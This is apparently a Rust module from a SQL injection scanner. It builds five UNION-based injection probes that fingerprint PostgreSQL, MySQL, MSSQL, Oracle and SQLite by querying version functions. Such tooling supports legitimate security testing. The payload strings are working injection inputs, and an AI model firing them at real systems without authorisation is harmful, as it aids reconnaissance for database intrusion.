use super::GeneratedPayload;
use crate::clause_map::SqlClause;
use crate::detection::DbmsFamily;
use crate::types::ProbeType;

pub fn generate() -> Vec<GeneratedPayload> {
    let probes: Vec<(&str, &str, DbmsFamily, SqlClause)> = vec![
        // PostgreSQL: version() function
        ("syntax-pg-version", "' UNION SELECT version()--", DbmsFamily::PostgreSQL, SqlClause::Select),
        // MySQL: CONCAT with MySQL-specific syntax
        ("syntax-mysql-concat", "' UNION SELECT CONCAT('a','b')--", DbmsFamily::MySQL, SqlClause::StringConcat),
        // MSSQL: @@version system variable
        ("syntax-mssql-version", "' UNION SELECT @@version--", DbmsFamily::MSSQL, SqlClause::Select),
        // Oracle: FROM DUAL
        ("syntax-oracle-dual", "' UNION SELECT banner FROM v$version--", DbmsFamily::Oracle, SqlClause::Select),
        // SQLite: sqlite_version()
        ("syntax-sqlite-version", "' UNION SELECT sqlite_version()--", DbmsFamily::SQLite, SqlClause::Select),
    ];

    probes
        .into_iter()
        .map(|(name, payload, dbms, clause)| GeneratedPayload {
            name: name.to_string(),
            probe_type: ProbeType::SyntaxFeature,
            payload_str: payload.to_string(),
            expected_dbms: Some(dbms),
            clause: Some(clause),
        })
        .collect()
}
